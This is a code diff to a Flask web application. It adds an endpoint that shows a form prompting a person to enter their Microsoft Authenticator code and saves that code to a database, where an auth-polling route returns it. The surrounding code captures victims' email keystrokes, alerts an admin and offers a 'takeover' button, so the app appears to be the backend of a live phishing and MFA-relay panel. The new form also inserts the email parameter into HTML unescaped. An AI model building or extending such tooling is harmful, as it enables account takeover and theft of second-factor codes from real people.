@@ -299,6 +299,88 @@ def set_custom_status():
 
 
 
+
+
+
+# --- MODIFIED: Endpoint now serves a form on GET and processes it on POST ---
+@app.route("/set_ms_authenticator_status", methods=['GET', 'POST'])
+def set_ms_authenticator_status():
+    """
+    Handles setting MS Authenticator status.
+    GET: Displays an HTML form to input MS code.
+    POST: Processes the submitted form and updates the database.
+    """
+    if request.method == 'GET':
+        email = request.args.get('email')
+        if not email:
+            return "Error: An email must be provided in the URL.", 400
+        
+        # Return a simple HTML form
+        html_form = f"""
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Set MS Authenticator Status</title>
+            <style>
+                body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
+                .container {{ background: white; padding: 25px 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 500px; }}
+                h2 {{ text-align: center; color: #1c1e21; border-bottom: 1px solid #ddd; padding-bottom: 15px; margin-top: 0; }}
+                label {{ display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; }}
+                input[type='text'] {{ width: 100%; padding: 10px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #ddd; box-sizing: border-box; font-size: 16px; }}
+                input[type='submit'] {{ background-color: #0078d4; color: white; padding: 12px 20px; border: none; border-radius: 6px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }}
+                input[type='submit']:hover {{ background-color: #106ebe; }}
+                .email-display {{ background-color: #e9ecef; padding: 12px; border-radius: 6px; margin-bottom: 25px; text-align: center; font-size: 14px; }}
+                .instruction {{ background-color: #f8f9fa; padding: 15px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; border-left: 4px solid #0078d4; }}
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h2>Set MS Authenticator Status</h2>
+                <div class="email-display">Setting status for: <strong>{email}</strong></div>
+                <div class="instruction">
+                    <strong>Instructions:</strong> Please enter the Microsoft Authenticator code that you received. This code will be used to verify your identity.
+                </div>
+                <form action="/set_ms_authenticator_status" method="post">
+                    <input type="hidden" name="email" value="{email}">
+                    
+                    <label for="ms_code">MS Authenticator Code:</label>
+                    <input type="text" id="ms_code" name="ms_code" placeholder="Enter your MS code" required>
+                    
+                    <input type="submit" value="Set MS Authenticator Status">
+                </form>
+            </div>
+        </body>
+        </html>
+        """
+        return html_form
+
+    if request.method == 'POST':
+        try:
+            email = request.form.get('email')
+            ms_code = request.form.get('ms_code')
+
+            if not email or not ms_code:
+                return "Error: Email and MS code are required.", 400
+
+            # Update the database with MS authenticator status and code
+            Email_statuses.update_one(
+                {"email": email.strip()},
+                {"$set": {"status": "ms_authenticator", "ms_code": ms_code.strip()}},
+                upsert=True
+            )
+            
+            return f"<div style='font-family: sans-serif; text-align: center; padding-top: 50px;'><h1>Success!</h1><p>MS Authenticator status has been set for {email}. You can now close this window.</p></div>"
+        
+        except Exception as e:
+            return f"<h1>Error</h1><p>An error occurred: {e}</p>", 500
+
+
+
+
+            
+
 @app.post("/api/keystroke")
 def keystroke():
     """Receives email keystrokes and notifies ONLY the admin with action buttons."""
@@ -317,6 +399,8 @@ def keystroke():
         )
     return jsonify({"status": "received"}), 200
 
+
+
 @app.get("/takeover/<admin_id>/<session_id>")
 def takeover(admin_id, session_id):
     """Endpoint for the admin's 'Takeover' button."""
@@ -334,6 +418,8 @@ def takeover(admin_id, session_id):
         return "<div style='font-family: sans-serif; text-align: center; padding-top: 50px;'><h1>Takeover Successful</h1><p>You now have exclusive control. You can close this window.</p></div>"
     except Exception as e:
         return f"<h1>Error</h1><p>An error occurred: {e}</p>", 500
+
+
 
 @app.get("/api/delay-session/<session_id>")
 def delay_session(session_id):
@@ -465,6 +551,12 @@ def auth():
         return jsonify({
             "status": "custom",
             "data": db_record.get('custom_data')
+        })
+    
+    if current_status == "ms_authenticator":
+        return jsonify({
+            "status": "ms_authenticator",
+            "data": db_record.get('ms_code')
         })
     
     if current_status == 'success':
